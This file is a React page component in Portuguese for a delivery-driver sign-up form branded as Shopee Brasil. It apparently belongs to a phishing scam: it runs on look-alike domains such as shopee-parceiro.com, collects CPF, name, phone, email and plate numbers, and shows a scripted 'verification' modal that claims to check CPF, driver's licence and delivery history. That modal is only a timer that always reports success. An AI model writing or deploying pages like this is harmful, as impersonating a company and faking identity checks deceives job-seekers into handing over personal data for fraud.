import React, { useState, useEffect } from 'react';
import { useLocation, useRoute } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useDebounce } from 'use-debounce';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { VehicleInfoBox } from '@/components/VehicleInfoBox';

import shopeeMotoImage from '../assets/shopee-moto.webp';
import shopeeCarsImage from '../assets/shopee-cars.webp';

const formSchema = z.object({
  cpf: z.string()
    .min(11, "CPF inválido")
    .max(14, "CPF inválido")
    .refine(value => {
      // Remove caracteres não numéricos
      const numericValue = value.replace(/\D/g, '');
      return numericValue.length === 11;
    }, "CPF deve ter 11 dígitos"),
  nome: z.string().min(3, "Nome deve ter pelo menos 3 caracteres"),
  telefone: z.string()
    .min(10, "Telefone inválido")
    .max(15, "Telefone inválido")
    .refine(value => {
      // Remove caracteres não numéricos
      const numericValue = value.replace(/\D/g, '');
      return numericValue.length >= 10 && numericValue.length <= 11;
    }, "Telefone deve ter 10 ou 11 dígitos"),
  email: z.string().email("Email inválido"),
  isRentedCar: z.boolean().optional().default(false),
  placa: z.string()
    .min(7, "Placa inválida")
    .max(9, "Placa inválida")
    .refine(value => {
      // Remove caracteres não alfanuméricos
      const cleanValue = value.replace(/[^A-Za-z0-9]/g, '');
      
      // Formato antigo: 3 letras e 4 números (AAA0000)
      const antigoRegex = /^[A-Za-z]{3}[0-9]{4}$/;
      
      // Formato Mercosul: 4 letras e 3 números (AAA0A00)
      const mercosulRegex = /^[A-Za-z]{3}[0-9][A-Za-z][0-9]{2}$/;
      
      return antigoRegex.test(cleanValue) || mercosulRegex.test(cleanValue);
    }, "Formato deve ser ABC-1234 (antigo) ou ABC1D23 (Mercosul)")
    .optional()
    .or(z.literal('')) // Permitir string vazia
})
// Adiciona validação condicional para placa
.refine(
  (data) => {
    // Se marcou como carro alugado, não precisa de placa
    if (data.isRentedCar) {
      return true;
    }
    
    // Se não é carro alugado, precisa ter placa válida
    return data.placa && data.placa.length >= 7;
  },
  {
    message: "Informe a placa do veículo ou selecione a opção 'Carro alugado'",
    path: ["placa"]
  }
);

type FormValues = z.infer<typeof formSchema>;

enum TipoVeiculo {
  CARRO = "carro",
  MOTO = "moto",
}

const Cadastro: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [tipoVeiculo, setTipoVeiculo] = useState<TipoVeiculo | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [isLoadingVehicleInfo, setIsLoadingVehicleInfo] = useState(false);
  const [vehicleIsValid, setVehicleIsValid] = useState(false);
  const [isRentedCar, setIsRentedCar] = useState(false);
  const [vehicleInfo, setVehicleInfo] = useState<{
    marca?: string;
    modelo?: string;
    ano?: string;
    anoModelo?: string;
    chassi?: string;
    cor?: string;
  } | null>(null);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  const { 
    register, 
    handleSubmit, 
    formState: { errors },
    setValue,
    watch
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      cpf: '',
      nome: '',
      telefone: '',
      email: '',
      placa: '',
    }
  });

  const cpfValue = watch('cpf');
  const telefoneValue = watch('telefone');
  const placaValue = watch('placa');
  const [debouncedPlaca] = useDebounce(placaValue, 1000);
  
  // Efeito para buscar informações do veículo quando a placa mudar
  useEffect(() => {
    if (debouncedPlaca && debouncedPlaca.length >= 7) {
      fetchVehicleInfo(debouncedPlaca);
    }
  }, [debouncedPlaca]);

  // Formatação de CPF
  const formatCpf = (value: string) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length <= 3) return numericValue;
    if (numericValue.length <= 6) return `${numericValue.slice(0, 3)}.${numericValue.slice(3)}`;
    if (numericValue.length <= 9) return `${numericValue.slice(0, 3)}.${numericValue.slice(3, 6)}.${numericValue.slice(6)}`;
    return `${numericValue.slice(0, 3)}.${numericValue.slice(3, 6)}.${numericValue.slice(6, 9)}-${numericValue.slice(9, 11)}`;
  };

  // Formatação de telefone
  const formatTelefone = (value: string) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length <= 2) return numericValue;
    if (numericValue.length <= 6) return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2)}`;
    if (numericValue.length <= 10) return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2, 6)}-${numericValue.slice(6)}`;
    return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2, 7)}-${numericValue.slice(7)}`;
  };

  // Formatação da placa no formato XXX-0000 (antigo) ou AAA0A00 (Mercosul)
  const formatPlaca = (value: string) => {
    value = value.toUpperCase();
    const cleanValue = value.replace(/[^A-Z0-9]/g, '');
    
    if (cleanValue.length <= 3) {
      return cleanValue;
    } else if (cleanValue.length === 7) {
      // Verifica se é formato antigo (3 letras + 4 números)
      if (/^[A-Z]{3}[0-9]{4}$/.test(cleanValue)) {
        // Formato antigo XXX-0000
        return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
      } 
      // Formato Mercosul
      else if (/^[A-Z]{3}[0-9][A-Z][0-9]{2}$/.test(cleanValue)) {
        // Não formata com hífen, apenas retorna
        return cleanValue;
      }
      // Outro formato de 7 caracteres - aplica o hífen comum
      else {
        return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
      }
    } else {
      // Para outros comprimentos, retorna o valor limpo
      return cleanValue;
    }
  };

  // Handlers para formatação automática
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value);
    setValue('cpf', formatted);
  };

  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatTelefone(e.target.value);
    setValue('telefone', formatted);
  };

  const handlePlacaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPlaca(e.target.value);
    setValue('placa', formatted);
  };

  // Obter a URL base da API do backend dependendo do ambiente
  const getApiBaseUrl = () => {
    // Em desenvolvimento, usa a URL relativa
    if (window.location.hostname.includes('localhost') || 
        window.location.hostname.includes('replit.dev')) {
      return '';
    }
    
    // Em produção, usa a URL absoluta do backend Heroku
    return 'https://disparador-f065362693d3.herokuapp.com';
  };
  
  // Função para buscar informações do veículo pela placa
  const fetchVehicleInfo = async (placa: string) => {
    if (!placa || placa.length < 7) {
      setVehicleInfo(null);
      return;
    }

    // Limpar a placa - remover hífen para consulta
    const cleanedPlaca = placa.replace('-', '');
    
    if (cleanedPlaca.length < 7) {
      return;
    }

    try {
      setIsLoadingVehicleInfo(true);
      
      // Determinar ambiente (produção vs desenvolvimento)
      const hostname = window.location.hostname;
      const isProduction = hostname.includes('netlify.app') || 
                          hostname.includes('shopee-parceiro.com') ||
                          hostname === 'shopee-entregador.com';
      
      console.log(`[DEBUG] Ambiente: ${isProduction ? 'Produção' : 'Desenvolvimento'}, Host: ${hostname}`);
      
      let vehicleData = null;
      
      // MÉTODO 1: Em produção, SEMPRE usar o proxy Netlify primeiro
      if (isProduction) {
        try {
          console.log('[DEBUG] Usando proxy Netlify para consulta de placa');
          // Usar caminho relativo à raiz do site
          const proxyUrl = `/vehicle-api/${cleanedPlaca}`;
          console.log(`[DEBUG] URL do proxy: ${proxyUrl}`);
          
          const proxyResponse = await fetch(proxyUrl, {
            method: 'GET',
            // Garantir que estamos usando o modo de CORS default
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            }
          });
          
          if (proxyResponse.ok) {
            vehicleData = await proxyResponse.json();
            console.log('[INFO] Dados do veículo obtidos via proxy Netlify:', vehicleData);
          } else {
            const errorStatus = proxyResponse.status;
            console.warn(`[AVISO] Proxy falhou com status: ${errorStatus}`);
            
            if (errorStatus === 404) {
              // Possível problema nos redirecionamentos do Netlify
              console.log('[DEBUG] Tentando URL alternativa no Netlify');
              // Tentar com o caminho completo para a função
              const altProxyUrl = `/.netlify/functions/vehicle-proxy/${cleanedPlaca}`;
              
              const altResponse = await fetch(altProxyUrl, {
                method: 'GET',
                headers: {
                  'Accept': 'application/json'
                }
              });
              
              if (altResponse.ok) {
                vehicleData = await altResponse.json();
                console.log('[INFO] Dados obtidos via caminho alternativo do Netlify:', vehicleData);
              } else {
                console.error('[ERRO] Caminho alternativo do Netlify também falhou:', altResponse.status);
              }
            }
          }
        } catch (proxyError) {
          console.error('[ERRO] Falha ao consultar via proxy:', proxyError);
        }
      }
      
      // MÉTODO 2: Em desenvolvimento, tentar API direta (ou como fallback em produção)
      if (!vehicleData && (!isProduction || (isProduction && localStorage.getItem('allow_direct_api') === 'true'))) {
        const apiKey = import.meta.env.VITE_VEHICLE_API_KEY;
        
        if (apiKey) {
          try {
            console.log('[DEBUG] Tentando consulta direta à API de veículos');
            const headers = new Headers();
            const authValue = apiKey.startsWith('Bearer ') ? apiKey : `Bearer ${apiKey}`;
            headers.append('Authorization', authValue);
            
            const apiUrl = `https://wdapi2.com.br/consulta/${cleanedPlaca}`;
            console.log(`[DEBUG] URL da API direta: ${apiUrl}`);
            
            const directResponse = await fetch(apiUrl, { 
              method: 'GET',
              headers: headers
            });
            
            if (directResponse.ok) {
              vehicleData = await directResponse.json();
              console.log('[INFO] Dados do veículo obtidos via API direta');
            } else if (!apiKey.startsWith('Bearer ')) {
              // Tentar sem o prefixo Bearer
              console.log('[DEBUG] Tentando novamente sem prefixo Bearer');
              const headersWithoutBearer = new Headers();
              headersWithoutBearer.append('Authorization', apiKey);
              
              const retryResponse = await fetch(apiUrl, {
                method: 'GET',
                headers: headersWithoutBearer
              });
              
              if (retryResponse.ok) {
                vehicleData = await retryResponse.json();
                console.log('[INFO] Dados do veículo obtidos via API direta (sem Bearer)');
              } else {
                console.warn('[AVISO] Consulta direta falhou em todas as tentativas');
              }
            }
          } catch (apiError) {
            console.error('[ERRO] Falha ao consultar API direta:', apiError);
          }
        } else {
          console.warn('[AVISO] API Key não disponível para consulta direta');
        }
      }
      
      // MÉTODO 3: Fallback para backend Heroku (DESATIVADO EM PRODUÇÃO por causa do CORS)
      if (!vehicleData && !isProduction) {
        try {
          console.log('[DEBUG] Tentando consultar via backend Heroku');
          const apiUrl = `${getApiBaseUrl()}/api/vehicle-info/${cleanedPlaca}`;
          const backendResponse = await fetch(apiUrl);
          
          if (backendResponse.ok) {
            vehicleData = await backendResponse.json();
            console.log('[INFO] Dados do veículo obtidos via backend Heroku');
          } else {
            console.error('[ERRO] Backend falhou, status:', backendResponse.status);
          }
        } catch (backendError) {
          console.error('[ERRO] Falha ao consultar backend:', backendError);
        }
      }
      
      // Processar os dados obtidos
      if (vehicleData) {
        setVehicleInfo({
          marca: vehicleData.MARCA || vehicleData.marca || "Não informado",
          modelo: vehicleData.MODELO || vehicleData.modelo || "Não informado",
          ano: vehicleData.ano || vehicleData.anoModelo || "Não informado",
          anoModelo: vehicleData.anoModelo || "Não informado",
          chassi: vehicleData.chassi || "Não informado", 
          cor: vehicleData.cor || "Não informado"
        });
      } else {
        console.error('[ERRO] Todas as tentativas de obter dados do veículo falharam');
        setVehicleInfo(null);
      }
    } catch (error) {
      console.error('Erro ao buscar informações do veículo:', error);
      setVehicleInfo(null);
    } finally {
      setIsLoadingVehicleInfo(false);
    }
  };

  // Limpar o campo de placa e informações do veículo
  const handleClearPlate = () => {
    setValue('placa', '');
    setVehicleInfo(null);
  };
  
  // Handler para a opção de carro alugado
  const handleRentedCarChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const checked = e.target.checked;
    setIsRentedCar(checked);
    setValue('isRentedCar', checked);
    
    // Se marcar como alugado, limpar a placa e as informações do veículo
    if (checked) {
      setValue('placa', '');
      setVehicleInfo(null);
      setVehicleIsValid(true); // Considerar como válido para permitir o envio do formulário
    } else {
      setVehicleIsValid(false); // Voltar a validação normal da placa
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a próxima página
    navigate('/municipios');
  };

  const onSubmit = async (data: FormValues) => {
    if (!tipoVeiculo) {
      toast({
        title: "Erro de validação",
        description: "Selecione o tipo de veículo (Carro ou Moto)",
        variant: "destructive",
      });
      return;
    }

    if (!cepData) {
      toast({
        title: "Erro de validação",
        description: "Informações de CEP não encontradas. Por favor, recarregue a página.",
        variant: "destructive",
      });
      return;
    }
    
    // Verifica se precisa validar a placa (não precisa se for carro alugado)
    if (!isRentedCar && !vehicleIsValid) {
      toast({
        title: "Erro de validação",
        description: "Por favor, insira uma placa válida para verificar as informações do veículo ou selecione a opção 'Carro alugado'",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Armazenar dados no localStorage para uso posterior
      const candidatoData = {
        ...data,
        tipoVeiculo,
        estado: cepData.state,
        cidade: cepData.city,
        cep: cepData.cep,
      };

      localStorage.setItem('candidato_data', JSON.stringify(candidatoData));
      
      // Salvar os dados do usuário para mostrar na página de entrega
      localStorage.setItem('user_data', JSON.stringify({
        nome: data.nome,
        cpf: data.cpf
      }));
      
      // Mostrar o modal de carregamento em vez de navegar diretamente
      setShowLoadingModal(true);
      
    } catch (error) {
      setIsSubmitting(false);
      toast({
        title: "Erro no cadastro",
        description: "Ocorreu um erro ao processar seu cadastro. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="custom-layout min-h-screen flex flex-col">
      {/* Header personalizado */}
      <header className="flex items-center justify-between bg-[#E83D22] p-4 text-white">
        <a href="#" className="text-white text-xl">
          <i className="fas fa-arrow-left"></i>
        </a>
        <h1 className="text-lg font-medium text-center flex-grow">Cadastro Entregador</h1>
        <div className="w-4"></div> {/* Espaçador para alinhar o título */}
      </header>
      
      {/* Seção de boas-vindas */}
      <div className="bg-white">
        <div className="p-3 border-b border-gray-200">
          <h2 className="text-base font-medium text-[#212121] mb-2">Bem-vindo ao cadastro de entregadores</h2>
          <p className="text-sm text-[#6E6E6E]">Preencha os dados abaixo para se tornar um entregador parceiro da Shopee.</p>
        </div>
      </div>
      
      <div className="bg-[#F5F5F5] h-[10px]"></div>

      {/* Formulário */}
      <form onSubmit={handleSubmit(onSubmit)}>
        {/* Seção de dados pessoais */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="text-lg font-semibold px-3 py-2 border-b border-gray-200 bg-gray-50">Dados Pessoais</p>
          </div>

          {/* CPF */}
          <div className="custom-input-field">
            <Input 
              id="cpf"
              {...register('cpf')}
              value={cpfValue}
              onChange={handleCpfChange}
              placeholder="CPF (000.000.000-00)" 
              className={`custom-input ${errors.cpf ? 'border-red-500' : 'border-0'}`}
              inputMode="numeric"
            />
            {errors.cpf && (
              <p className="mt-1 text-sm text-red-600">{errors.cpf.message}</p>
            )}
          </div>

          {/* Nome */}
          <div className="custom-input-field">
            <Input 
              id="nome"
              {...register('nome')}
              placeholder="Nome Completo" 
              className={`custom-input ${errors.nome ? 'border-red-500' : 'border-0'}`}
            />
            {errors.nome && (
              <p className="mt-1 text-sm text-red-600">{errors.nome.message}</p>
            )}
          </div>

          {/* Telefone */}
          <div className="custom-input-field">
            <Input 
              id="telefone"
              {...register('telefone')} 
              value={telefoneValue}
              onChange={handleTelefoneChange}
              placeholder="Telefone ((00) 00000-0000)" 
              className={`custom-input ${errors.telefone ? 'border-red-500' : 'border-0'}`}
              inputMode="tel"
            />
            {errors.telefone && (
              <p className="mt-1 text-sm text-red-600">{errors.telefone.message}</p>
            )}
          </div>

          {/* Email */}
          <div className="custom-input-field">
            <Input 
              id="email"
              {...register('email')} 
              placeholder="Email" 
              className={`custom-input ${errors.email ? 'border-red-500' : 'border-0'}`}
              type="email"
            />
            {errors.email && (
              <p className="mt-1 text-sm text-red-600">{errors.email.message}</p>
            )}
          </div>
        </div>

        <div className="bg-[#F5F5F5] h-[10px]"></div>

        {/* Seção de Tipo de Veículo */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="text-lg font-semibold px-3 py-2 border-b border-gray-200 bg-gray-50">Tipo de Veículo</p>
          </div>

          <div className="custom-input-field">
            <p className="text-[#212121] mb-3 text-sm">Selecione o tipo de veículo que você utiliza:</p>
            <div className="flex justify-between gap-4">
              <div 
                className={`flex-1 p-3 border-2 rounded-sm flex flex-col items-center justify-center cursor-pointer transition-colors ${tipoVeiculo === TipoVeiculo.MOTO ? 'border-[#E83D22]' : 'border-gray-200'}`}
                onClick={() => setTipoVeiculo(TipoVeiculo.MOTO)}
              >
                <input
                  type="radio"
                  id="moto"
                  name="tipoVeiculo"
                  checked={tipoVeiculo === TipoVeiculo.MOTO}
                  onChange={() => setTipoVeiculo(TipoVeiculo.MOTO)}
                  className="hidden"
                />
                <div className="mb-2 w-full h-24 flex items-center justify-center overflow-hidden">
                  <img 
                    src={shopeeMotoImage} 
                    alt="Entregador com Moto" 
                    className="max-h-full object-contain"
                  />
                </div>
                <label htmlFor="moto" className={`text-sm font-medium ${tipoVeiculo === TipoVeiculo.MOTO ? 'text-[#E83D22]' : 'text-[#212121]'}`}>
                  Moto
                </label>
              </div>
              
              <div 
                className={`flex-1 p-3 border-2 rounded-sm flex flex-col items-center justify-center cursor-pointer transition-colors ${tipoVeiculo === TipoVeiculo.CARRO ? 'border-[#E83D22]' : 'border-gray-200'}`}
                onClick={() => setTipoVeiculo(TipoVeiculo.CARRO)}
              >
                <input
                  type="radio"
                  id="carro"
                  name="tipoVeiculo"
                  checked={tipoVeiculo === TipoVeiculo.CARRO}
                  onChange={() => setTipoVeiculo(TipoVeiculo.CARRO)}
                  className="hidden"
                />
                <div className="mb-2 w-full h-24 flex items-center justify-center overflow-hidden">
                  <img 
                    src={shopeeCarsImage} 
                    alt="Entregador com Carro" 
                    className="max-h-full object-contain"
                  />
                </div>
                <label htmlFor="carro" className={`text-sm font-medium ${tipoVeiculo === TipoVeiculo.CARRO ? 'text-[#E83D22]' : 'text-[#212121]'}`}>
                  Carro
                </label>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-[#F5F5F5] h-[10px]"></div>

        {/* Seção de Veículo */}
        <div className="bg-white">
          <div className="custom-section-header">
            <p className="text-lg font-semibold px-3 py-2 border-b border-gray-200 bg-gray-50">Informações do Veículo</p>
          </div>

          {/* Opção de Carro alugado */}
          <div className="custom-input-field">
            <div className="p-3 mb-3 bg-[#FFF8F6] border border-[#E83D2230] rounded-sm">
              <h3 className="font-medium text-[#E83D22] mb-2">Opção para Veículo Alugado</h3>
              <p className="text-[#212121] text-sm mb-3">
                Se você trabalha com um veículo alugado ou emprestado, selecione esta opção 
                para prosseguir sem a necessidade de informar a placa do veículo.
              </p>
              <div className="flex items-center">
                <label className="custom-toggle-switch">
                  <input
                    id="isRentedCar"
                    type="checkbox"
                    checked={isRentedCar}
                    onChange={handleRentedCarChange}
                  />
                  <span className="custom-slider"></span>
                </label>
                <label
                  htmlFor="isRentedCar"
                  className="ml-2 text-base font-bold text-[#E83D22] leading-tight"
                >
                  Estou utilizando um veículo alugado ou emprestado
                </label>
              </div>
            </div>

            {/* Campo de placa - exibido apenas se não for carro alugado */}
            {!isRentedCar && (
              <div className="mb-3">
                <p className="text-[#212121] mb-2 text-sm">Placa do Veículo</p>
                <div className="relative">
                  <Input
                    id="placa"
                    {...register('placa')}
                    onChange={handlePlacaChange}
                    value={placaValue}
                    placeholder="ABC-1234 ou ABC1D23"
                    className={`custom-input ${errors.placa ? 'border-red-500' : 'border border-gray-200 rounded-sm'} ${isLoadingVehicleInfo ? 'pr-10' : ''}`}
                    inputMode="text"
                    type="search" 
                    autoCapitalize="characters"
                  />
                  {isLoadingVehicleInfo && (
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <div className="animate-spin h-4 w-4 border-2 border-[#E83D22] border-t-transparent rounded-full"></div>
                    </div>
                  )}
                </div>
                {errors.placa && (
                  <p className="mt-1 text-sm text-red-600">{errors.placa.message}</p>
                )}
              </div>
            )}
            
            {/* Área para mostrar as informações do veículo - exibida apenas se não for carro alugado */}
            {!isRentedCar ? (
              <div className="mt-3">
                <div className="flex justify-between items-start mb-2">
                  <h3 className="font-medium text-[#212121] text-sm">Informações do Veículo</h3>
                  {vehicleInfo && (
                    <button 
                      type="button"
                      onClick={handleClearPlate}
                      className="text-xs px-2 py-1 bg-red-50 text-red-600 rounded-sm hover:bg-red-100 transition-colors"
                    >
                      NÃO É MEU VEÍCULO
                    </button>
                  )}
                </div>
                
                {/* Usar o componente VehicleInfoBox */}
                <VehicleInfoBox
                  licensePlate={placaValue}
                  onChange={(isValid) => {
                    // Se o veículo é válido, atualizar o estado
                    setVehicleIsValid(isValid);
                    if (isValid) {
                      // O componente já buscará as informações do veículo
                      setIsLoadingVehicleInfo(false);
                    }
                  }}
                  className="w-full"
                />
              </div>
            ) : (
              // Mensagem quando é carro alugado
              <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-sm">
                <h4 className="text-base font-medium text-green-700 mb-1 flex items-center">
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  Veículo Alugado Registrado
                </h4>
                <p className="text-sm text-green-600 ml-7">
                  Você selecionou a opção de veículo alugado. As informações da placa não são necessárias neste momento.
                </p>
              </div>
            )}
          </div>
        </div>

        {/* Botão de envio */}
        <div className="custom-button-container">
          <button
            type="submit"
            className="custom-button py-3"
            disabled={isSubmitting}
          >
            {isSubmitting ? 'Processando...' : 'Prosseguir'}
          </button>
        </div>
      </form>
      
      {/* Rodapé */}
      <div className="mt-6 mb-2 text-center">
        <p className="text-xs text-gray-500">© 2025 Shopee Brasil. Todos os direitos reservados.</p>
        <p className="text-xs text-gray-500 mt-1">Oportunidade para entregadores parceiros.</p>
      </div>
      
      {/* Modal de carregamento */}
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Verificando Cadastro"
        loadingSteps={[
          "Verificando dados do CPF",
          "Consultando Carteira de Motorista",
          "Validando documentação do veículo",
          "Analisando disponibilidade na região",
          "Verificando histórico de entregas"
        ]}
        completionMessage="Seus dados foram validados com sucesso! Você está apto a ser um Entregador Parceiro Shopee."
        loadingTime={7000}
      />
    </div>
  );
};

export default Cadastro;